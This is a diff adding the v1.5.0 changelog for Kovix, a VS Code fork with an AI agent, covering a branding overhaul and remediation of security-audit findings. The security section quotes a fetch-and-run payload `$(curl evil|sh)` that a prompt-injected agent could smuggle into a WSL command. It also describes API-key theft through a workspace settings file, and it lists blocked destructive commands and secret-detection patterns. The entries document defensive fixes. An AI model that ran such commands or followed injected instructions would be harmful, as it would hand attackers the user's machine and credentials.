@@ -1,5 +1,76 @@
 # Changelog
 
+## v1.5.0 — The Identity Release + Security Hardening
+
+**Release date:** 2026-06-20
+
+Kovix v1.5.0 ships two major bodies of work on top of v1.4.0: the **Identity Release** (the visual differentiation that makes Kovix read as a new product, not a VS Code fork) and a **full security audit remediation** (17 findings closed across 4 commits, covering critical credential-exfiltration and RCE vulnerabilities).
+
+Every surface a user touches in their first 60 seconds has been re-themed with the Kovix identity: true-black shell, Volt-purple accent, K-logo brand mark, and Kovix-branded chrome across the activity bar, status bar, command palette, settings UI, and About dialog. Every dangerous code path flagged by the security audit has been closed.
+
+### Added — Identity Release (commit e1d4ea53)
+
+- **Launch splash** (`kovixSplash.ts`) — full-bleed K-mark overlay during workbench boot. Fades out on `LifecyclePhase.Restored` or after 1.5s safety cap. Works in browser and Electron.
+- **Welcome screen** (`kovixWelcome.ts`) — first-launch webview with K mark, tagline, three CTAs (Start new project / Open folder / 60-second tour), and a 3-card "What's different about Kovix" feature grid. Strict CSP. Re-openable via `kovix.welcome.open` command.
+- **Brand chrome** (`kovixBrandChrome.ts`) — K-logo button at top of activity bar (clickable → welcome). Pulsing Volt status dot at far left of status bar, reacts to `aiService.getExecutionState()`.
+- **Surface branding** (`kovixSurfaceBranding.ts`) — MutationObserver-based injector for the Kovix Command Palette header, Settings UI header band with "Open Agent Settings" CTA, and About dialog brand panel + VS Code Monaco credit (MIT legal requirement).
+- **Command bridge** (`kovixCommandBridge.ts`) — `window.kovixCommandBridge.executeCommand()` exposed at `LifecyclePhase.Starting` so DOM-injected HTML can dispatch workbench commands.
+- **Design tokens** (`kovix-brand.css`, 496 lines) — every VS Code `--vscode-*` theme variable mapped to a Kovix token. Re-themes the entire workbench shell in one file.
+- **K-logo sprite** (`kovix-logos.svg`) — 5 size variants (16/24/48/128/192px), gradient tile + chip-notch K glyph + glow halo.
+- **Canonical splash definition** (`kovix-splash.html`) — static HTML splash for Electron main process.
+
+### Added — Discoverability Fixes (commit 6079c343)
+
+- **Top-level Kovix menu** (`kovixMenu.ts`, 530 lines) — registered between Terminal and Help, organizes all 53 Kovix commands into 8 submenus: Agent / Memory / Skills / Swarm / Autonomous / MCP / Tools / Settings. Closes the "77% of features are command-palette-only" gap from the UI button audit.
+- **Slash command autocomplete dropdown** (`kovixSlashDropdown.ts`, 220 lines) — appears when user types '/', lists all 7 slash commands (`/skills`, `/skill-create`, `/memory`, `/swarm`, `/idea`, `/autonomous`, `/forget-everything`) with descriptions, filterable, arrow-key navigable.
+- **6 missing buttons in agent panel header** — Mode switcher, Swarm, Skills, MCP, Autonomous, Ponytail. All were command-palette-only before.
+- **5 new keybindings** + status bar hover affordances for discoverability.
+
+### Added — Security Hardening (commits 4c209aa0, 7d9c8b44, 05948beb, bc2bb6dd)
+
+**Critical fixes (batch 1):**
+- **C1 — API key plaintext storage closed.** Removed the dual-write pattern that wrote provider API keys to `IStorageService` (plaintext JSON on disk) alongside the OS keychain. The OS keychain (Keychain on macOS, libsecret on Linux, Credential Manager on Windows) is now the single source of truth. A one-time migration path seeds the keychain from any leftover plaintext key on first run after upgrade, then purges the plaintext copy.
+- **C2 — Workspace-scoped LLM base URL override closed.** Changed `construct.cloud.baseUrl`, `construct.ollama.baseUrl`, and `construct.security.allowExternalTargets` from `scope: WINDOW` (per-workspace, settable via `.vscode/settings.json`) to `scope: APPLICATION` (machine-wide). Previously, a malicious workspace could ship a `.vscode/settings.json` that redirected LLM API calls to an attacker-controlled server, exfiltrating the user's real API key sent as a Bearer header.
+- **C3 — WSL command wrapping injection closed.** The previous code interpolated user commands into a double-quoted `bash -c "..."` string with only `"` escaped. Inside a double-quoted bash string, `$(...)`, backticks, and `\` are still expanded — a prompt-injected LLM could pass `$(curl evil|sh)` and get full RCE inside the WSL context. Replaced with a base64-encode → decode pattern that no shell metacharacter can survive.
+
+**High-severity fixes (batch 2):**
+- **H1 — SSRF safeFetch.** New `urlGuard.ts` module with `assertSafeUrl` + `safeFetch` that blocks link-local (169.254.169.254 — the cloud metadata endpoint), loopback (127/8), private (10/8, 172.16/12, 192.168/16), IPv6 loopback (::1), link-local (fe80::), unique-local (fc00::/7), and `localhost`/`.internal`/`.local`/`.localhost` hostnames. Wired into agent-reach RSS reader, webpage reader, YouTube transcript fetcher, and skill-registry URL imports.
+- **H2 — MCP marketplace consent gate.** Marketplace-installed MCP servers now require explicit user approval before they can spawn. The `IMCPServerDefinition` interface gained a `userApproved` field; `MCPConnectionPool.connectRawStdio` refuses to spawn any non-builtin server without it. Process-env leakage was also closed — only a curated allowlist (PATH, HOME, LANG, TEMP + Kovix flags) is passed to spawned MCP servers, instead of the entire `process.env`. Server-specific env vars from `def.env` are layered on top, scoped to that one server.
+- **H3 — PromptSanitiser gap closed.** Universal-memory and skill-context outputs are now passed through `PromptSanitiser.sanitise()` before being injected into LLM context, closing the gap with file-read, search-result, and terminal-output paths that were already sanitised.
+- **H4 — Terminal allowlist rework.** Removed 18 interpreter commands (node, python, npx, npm, yarn, pip, cargo, go, dotnet, java, javac, mvn, gradle, rustc, make, cmake, gcc, g++, clang, tsc) from `DEFAULT_COMMAND_ALLOWLIST`. Also removed `curl` and `wget` (can fetch-and-pipe to shell). Fixed a `startsWith` bug in `isCommandInAllowlist` where `curl-evil` was matching `curl`. Added `INTERPRETER_COMMANDS` set + `isInterpreterCommand()` helper.
+
+**Medium + Low fixes (batch 3):**
+- **M1 — innerHTML XSS closed.** Added `escapeHtml()` helper and wrapped every dynamic interpolation in 13 `innerHTML` assignments across `kovixAgentSettings.ts`. Switched `kovixMemoryGraph.ts:485` and `kovixAgentControlCenter.ts:312/318/339` to full DOM construction (`textContent` + `dom.append`).
+- **M2 — Onboarding postMessage origin check.** Added `isTrustedHostMessage()` validator accepting only messages with `event.source === window.parent` AND origin matching the `vscode-webview://` family. All other-origin and wrong-source cases are rejected.
+- **M3 — Terminal blocklist expanded** from 12 → 29 patterns. New coverage: `rm -rf ~`/`$HOME`/`*`/`../` (was only literal `/`), `su`/`doas`/`pkexec` (was only `sudo`), `halt`/`poweroff`/`telinit N`/`systemctl reboot/poweroff/halt/suspend/hibernate`, `tee /etc/`, `cp`/`mv`/`install`/`dd` to `/etc/`, `insmod .ko`, `rmmod`, `modprobe -r`, `dd`/`cp` to `/dev/sd|nvme|hd|vd|xvd`.
+- **M4 — PromptSanitiser delimiter entropy.** Replaced `Math.random()` + `Date.now()` delimiter ID with `crypto.getRandomValues(16 bytes)` hex-encoded (128 bits of CSPRNG). Closes the XorShift128+ state-recovery vector.
+- **M6 — MCP spawn capability cached at startup.** The Node-environment capability check now runs once in the constructor (with a clear log warning at startup) instead of on every spawn attempt. vscode-web users see the spawn-disabled message the moment the service is instantiated.
+- **L1 — Shell metachar regex typo fixed.** Backtick alternation bug closed. Backticks in args now caught.
+- **L2 — Welcome webview CSP nonce hardened.** `generateNonce()` now uses `crypto.getRandomValues` instead of `Math.random`.
+- **L3 — Secret log patterns expanded** with `nvapi-`, `gsk_`, `ghp_`/`gho_`/`ghs_`, `glpat-`, `xox*`, `Authorization: Basic`, UPPER_CASE env names (`KEY=`/`SECRET=`/etc.), 32+ hex strings, 40+ char tokens.
+
+**Batch 4 — UX follow-ups (commit bc2bb6dd):**
+- **MCP "Approve" button in settings UI.** Each non-builtin, unapproved MCP server card now shows a "needs approval" badge (orange) with a redacted env-key preview, plus an Approve button. Clicking it calls `mcpManager.approveServer(name)`, which persists the `userApproved` flag to `construct.mcp.servers` (durable across restarts) and re-renders the card. The Start button is hidden until approved — clicking it on an unapproved server would just fail with the consent-gate error.
+- **Interpreter-command confirmation dialog.** When the agent tries to run a command on the `INTERPRETER_COMMANDS` list (node, python, npx, curl, wget, docker, etc.), a modal confirmation dialog appears with the full command + working directory. User must click "Run once" to proceed; Cancel returns an error to the LLM so it can re-plan. Mirrors the existing `edit_file` diff-approval flow. Wired into both `agentLoop.run_command` and `constructToolRegistryService.executeRunTerminal` (covers the standalone tool-registry path used by Ponytail / autonomous mode). Restricted mode (default) still blocks interpreters via the allowlist before this gate fires — the gate covers the case where the user has explicitly disabled restricted mode.
+
+### Changed
+
+- `src/vs/workbench/browser/media/style.css` — prepended `@import` for `kovix-tokens.css` and `kovix-brand.css` so they apply globally.
+- `src/vs/workbench/contrib/construct/browser/construct.contribution.ts` — 5 new workbench contribution registrations + 1 new `kovix.welcome.open` command + Kovix menu registration + activity-bar order change.
+- `package.json` — version bumped from 1.4.0 to 1.5.0.
+- `README.md` — version badge bumped to 1.5.0.
+
+### Known issues
+
+- **293 dependabot vulnerabilities** on the default branch (10 critical, 135 high, 113 moderate, 35 low). These are pre-existing dependency CVEs in the VS Code fork baseline, not introduced by this release. A `npm audit fix` pass is scheduled for v1.5.1.
+- **OS app icons** (Windows `.ico`, macOS `.icns`, Linux `.png`) are still the VS Code default. The K-logo SVG sprite at `kovix-logos.svg` is the source — convert to platform-specific formats for v1.5.1.
+- **Electron main splash** — the canonical `kovix-splash.html` is not yet wired into the Electron main process. The in-workbench overlay (`kovixSplash.ts`) handles the splash experience; the Electron main wiring is a follow-up for v1.5.1.
+
+### Credits
+
+- Kovix is a fork of [Microsoft's Code-OSS](https://github.com/microsoft/vscode), used under the MIT License.
+- The Kovix Identity design system was developed by the Kovix team.
+
 ## [1.4.0] - 2026-06-19
 
 ### Skills system — the missing "tools & playbooks" layer
